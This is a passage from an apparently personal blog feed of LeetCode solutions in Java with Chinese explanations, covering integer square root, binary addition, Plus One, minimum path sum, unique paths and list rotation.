<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">mySqrt</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lo = <span class="number">1</span>, hi = x;</span><br><span class="line">    <span class="keyword">while</span> (lo &lt;= hi) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (lo + hi) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> cmp = mid - x/mid;</span><br><span class="line">        <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) hi = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>) lo = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lo - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[67. Add Binary]]></title>
      <url>/wiki/2017/10/30/Leetcode-67-Add-Binary/</url>
      <content type="html"><![CDATA[<p>Given two binary strings, return their sum (also a binary string).</p>
<p>The input strings are both non-empty and contains only characters 1 or 0.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: a = &quot;11&quot;, b = &quot;1&quot;</span><br><span class="line">Output: &quot;100&quot;</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: a = &quot;1010&quot;, b = &quot;1011&quot;</span><br><span class="line">Output: &quot;10101&quot;</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目其实想让我们模拟二进制加法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">addBinary</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a_len = a.length(), b_len = b.length();</span><br><span class="line">    <span class="keyword">int</span> n = Math.max(a_len, b_len);</span><br><span class="line">    <span class="keyword">int</span> add = <span class="number">0</span>, d;</span><br><span class="line">    StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &lt; a_len &amp;&amp; i &lt; b_len) &#123;</span><br><span class="line">            d = add + a.charAt(a_len - <span class="number">1</span>  - i) - <span class="string">'0'</span> + b.charAt(b_len -<span class="number">1</span> - i) - <span class="string">'0'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; a_len) &#123;</span><br><span class="line">            d = add + a.charAt(a_len - <span class="number">1</span> - i) - <span class="string">'0'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            d = add + b.charAt(b_len - <span class="number">1</span> - i) - <span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (d == <span class="number">0</span>) &#123;</span><br><span class="line">            res.append(<span class="string">"0"</span>);</span><br><span class="line">            add = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (d == <span class="number">1</span>) &#123;</span><br><span class="line">            res.append(<span class="string">"1"</span>);</span><br><span class="line">            add = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (d == <span class="number">2</span>)&#123;</span><br><span class="line">            res.append(<span class="string">"0"</span>);</span><br><span class="line">            add = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (d == <span class="number">3</span>) &#123;</span><br><span class="line">            res.append(<span class="string">"1"</span>);</span><br><span class="line">            add = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (add == <span class="number">1</span>) res.append(<span class="string">"1"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.reverse().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在论坛上看到的比较优雅的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">addBinary</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">int</span> i = a.length() - <span class="number">1</span>, j = b.length() -<span class="number">1</span>, carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> sum = carry;</span><br><span class="line">        <span class="keyword">if</span> (j &gt;= <span class="number">0</span>) sum += b.charAt(j--) - <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) sum += a.charAt(i--) - <span class="string">'0'</span>;</span><br><span class="line">        sb.append(sum % <span class="number">2</span>);</span><br><span class="line">        carry = sum / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (carry != <span class="number">0</span>) sb.append(carry);</span><br><span class="line">    <span class="keyword">return</span> sb.reverse().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我写的代码更快，后面的更好看一些。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> String </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[66. Plus One]]></title>
      <url>/wiki/2017/10/30/Leetcode-66-Plus-One/</url>
      <content type="html"><![CDATA[<p>Given a non-empty array of digits representing a non-negative integer, plus one to the integer.</p>
<p>The digits are stored such that the most significant digit is at the head of the list, and each element in the array contain a single digit.</p>
<p>You may assume the integer does not contain any leading zero, except the number 0 itself.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3]</span><br><span class="line">Output: [1,2,4]</span><br><span class="line">Explanation: The array represents the integer 123.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [4,3,2,1]</span><br><span class="line">Output: [4,3,2,2]</span><br><span class="line">Explanation: The array represents the integer 4321.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目考查的是基本的数组操作和基本的数学加法。一般情况下，只要将数组最后元素加1即可。但是可能会出现进位的情况，所以需要注意进位的加法。特别需要注意的是当最高位进位时的情况。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] plusOne(<span class="keyword">int</span>[] digits) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = digits.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">int</span> newdigit = carry + digits[i];</span><br><span class="line">        <span class="keyword">if</span> (newdigit &lt; <span class="number">10</span>)  &#123;</span><br><span class="line">            digits[i] = newdigit;</span><br><span class="line">            <span class="keyword">return</span> digits;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            digits[i] = newdigit - <span class="number">10</span>;</span><br><span class="line">            carry = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span>[] digitsLarge = <span class="keyword">new</span> <span class="keyword">int</span>[digits.length + <span class="number">1</span>];</span><br><span class="line">    digitsLarge[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; digits.length; i++)</span><br><span class="line">        digitsLarge[i+<span class="number">1</span>] = digits[i];</span><br><span class="line">    <span class="keyword">return</span> digitsLarge;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[64. Minimum Path Sum]]></title>
      <url>/wiki/2017/10/30/Leetcode-64-Minimum-Path-Sum/</url>
      <content type="html"><![CDATA[<p>Given a $m \times n$ grid filled with non-negative numbers, find a path from top left to bottom right which minimizes the sum of all numbers along its path.</p>
<p>Note: You can only move either down or right at any point in time.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  [1,3,1],</span><br><span class="line">  [1,5,1],</span><br><span class="line">  [4,2,1]</span><br><span class="line">]</span><br><span class="line">Output: 7</span><br><span class="line">Explanation: Because the path 1→3→1→1→1 minimizes the sum.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>典型的动态规划，非常简单直接。类似于LeetCode 62. Unique Paths.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minPathSum</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (grid == <span class="keyword">null</span> || grid.length == <span class="number">0</span> || grid[<span class="number">0</span>].length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[][] pathSums = grid.clone();</span><br><span class="line">    <span class="keyword">int</span> m = grid.length, n = grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++)</span><br><span class="line">        pathSums[i][<span class="number">0</span>] += pathSums[i - <span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">        pathSums[<span class="number">0</span>][j] += pathSums[<span class="number">0</span>][j - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">            pathSums[i][j] += Math.min(pathSums[i - <span class="number">1</span>][j], pathSums[i][j - <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> pathSums[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[63. Unique Paths II]]></title>
      <url>/wiki/2017/10/30/Leetcode-63-Unique-Paths-II/</url>
      <content type="html"><![CDATA[<p>A robot is located at the top-left corner of a $m \times n$ grid (marked ‘Start’ in the diagram below).</p>
<p>The robot can only move either down or right at any point in time. The robot is trying to reach the bottom-right corner of the grid (marked ‘Finish’ in the diagram below).</p>
<p>Now consider if some obstacles are added to the grids. How many unique paths would there be?</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/LeetCode62.png?imageslim" alt="Robot Maze"></p>
<p>An obstacle and empty space is marked as <code>1</code> and <code>0</code> respectively in the grid.</p>
<p>Note: $m$ and $n$ will be at most 100.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  [0,0,0],</span><br><span class="line">  [0,1,0],</span><br><span class="line">  [0,0,0]</span><br><span class="line">]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation:</span><br><span class="line">There is one obstacle in the middle of the 3x3 grid above.</span><br><span class="line">There are two ways to reach the bottom-right corner:</span><br><span class="line">1. Right -&gt; Right -&gt; Down -&gt; Down</span><br><span class="line">2. Down -&gt; Down -&gt; Right -&gt; Right</span><br></pre></td></tr></table></figure>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>在LeetCode 62. Unique Paths的基础上加了一个限制条件，路径上可能有石头。其实代码也只需要变动一次：判断有没有石头。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">uniquePathsWithObstacles</span><span class="params">(<span class="keyword">int</span>[][] obstacleGrid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (obstacleGrid == <span class="keyword">null</span> || obstacleGrid.length == <span class="number">0</span> || obstacleGrid[<span class="number">0</span>].length == <span class="number">0</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (obstacleGrid[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> m = obstacleGrid.length, n = obstacleGrid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span>[][] numPaths = <span class="keyword">new</span> <span class="keyword">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">    numPaths[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m + <span class="number">1</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n + <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">1</span> &amp;&amp; j == <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (obstacleGrid[i - <span class="number">1</span>][j - <span class="number">1</span>] == <span class="number">1</span>) numPaths[i][j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> numPaths[i][j] = numPaths[i][j - <span class="number">1</span>] + numPaths[i - <span class="number">1</span>][j];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> numPaths[m][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[62. Unique Paths]]></title>
      <url>/wiki/2017/10/30/Leetcode-62-Unique-Paths/</url>
      <content type="html"><![CDATA[<p>A robot is located at the top-left corner of a $m \times n$ grid (marked ‘Start’ in the diagram below).</p>
<p>The robot can only move either down or right at any point in time. The robot is trying to reach the bottom-right corner of the grid (marked ‘Finish’ in the diagram below).</p>
<p>How many possible unique paths are there?</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/LeetCode62.png?imageslim" alt="Robot Maze"><br><small>Above is a 7 x 3 grid. How many possible unique paths are there?</small></p>
<p><strong>Note</strong>: $m$ and $n$ will be at most 100.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: m = 3, n = 2</span><br><span class="line">Output: 3</span><br><span class="line">Explanation:</span><br><span class="line">From the top-left corner, there are a total of 3 ways to reach the bottom-right corner:</span><br><span class="line">1. Right -&gt; Right -&gt; Down</span><br><span class="line">2. Right -&gt; Down -&gt; Right</span><br><span class="line">3. Down -&gt; Right -&gt; Right</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: m = 7, n = 3</span><br><span class="line">Output: 28</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目要求路径的数量，又是二维棋盘，一看就是典型的动态规划题目。设想机器人站在终点坐标($m-1, n-1$)上，那么它的上一步来自哪里呢？有且仅有两种可能，来自($m-2, n-1$)和来自($m-1, n-2$)。那么答案非常明显了：加入站在终点坐标($i, j$)上，它只能来自($i-1, j$)和($i, j-1$)。这种自顶向下的方法形成的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m == <span class="number">0</span> || n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[][] numPaths = <span class="keyword">new</span> <span class="keyword">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">    numPaths[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m + <span class="number">1</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n + <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">1</span> &amp;&amp; j == <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">            numPaths[i][j] = numPaths[i][j - <span class="number">1</span>] + numPaths[i - <span class="number">1</span>][j];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> numPaths[m][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[61. Rotate List]]></title>
      <url>/wiki/2017/10/30/Leetcode-61-Rotate-List/</url>
      <content type="html"><![CDATA[<p>Given a linked list, rotate the list to the right by $k$ places, where $k$ is non-negative.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, k = 2</span><br><span class="line">Output: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL</span><br><span class="line">Explanation:</span><br><span class="line">rotate 1 steps to the right: 5-&gt;1-&gt;2-&gt;3-&gt;4-&gt;NULL</span><br><span class="line">rotate 2 steps to the right: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: 0-&gt;1-&gt;2-&gt;NULL, k = 4</span><br><span class="line">Output: 2-&gt;0-&gt;1-&gt;NULL</span><br><span class="line">Explanation:</span><br><span class="line">rotate 1 steps to the right: 2-&gt;0-&gt;1-&gt;NULL</span><br><span class="line">rotate 2 steps to the right: 1-&gt;2-&gt;0-&gt;NULL</span><br><span class="line">rotate 3 steps to the right: 0-&gt;1-&gt;2-&gt;NULL</span><br><span class="line">rotate 4 steps to the right: 2-&gt;0-&gt;1-&gt;NULL</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 这道题目是将链表右移k位，由于在链表末尾删除元素是比较麻烦的，所以将链表左移length-k位，其中length为链表长度。</span></span><br><span class="line"><span class="comment"> * 1. 链表左移时，即在链表末尾添加元素，从链表首部删除元素。用两个指针分别指向这两个位置，然后分别移动。</span></span><br><span class="line"><span class="comment"> * 2. 只记录将要移动的length-k位位置，然后再移动</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Link: https://leetcode.com/problems/rotate-list/description/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q61RotateListv1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 链表左移时，即在链表末尾添加元素，从链表首部删除元素</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">rotateRight</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head==<span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// length of list</span></span><br><span class="line">        <span class="keyword">int</span> length = <span class="number">1</span>;</span><br><span class="line">        ListNode pos = head;</span><br><span class="line">        ListNode first = head;</span><br><span class="line">        <span class="keyword">while</span>(pos.next!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            pos = pos.next;</span><br><span class="line">            length++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// rotate to right</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length - k % length; i++) &#123;</span><br><span class="line">            pos.next = first;</span><br><span class="line">            pos = pos.next;</span><br><span class="line">            first = first.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pos.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只记录将要移动的length-k位位置，然后再移动.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">rotateRight</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head==<span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// length of list</span></span><br><span class="line">        <span class="keyword">int</span> length = <span class="number">1</span>;</span><br><span class="line">        ListNode pos = head;</span><br><span class="line">        ListNode tail = head;</span><br><span class="line">        <span class="keyword">while</span> (tail.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            length++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get the length-n%length th node</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; length - k % length; i++) &#123;</span><br><span class="line">            pos = pos.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// do the rotation</span></span><br><span class="line">        tail.next = head;</span><br><span class="line">        head = pos.next;</span><br><span class="line">        pos.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Two Pointers </tag>
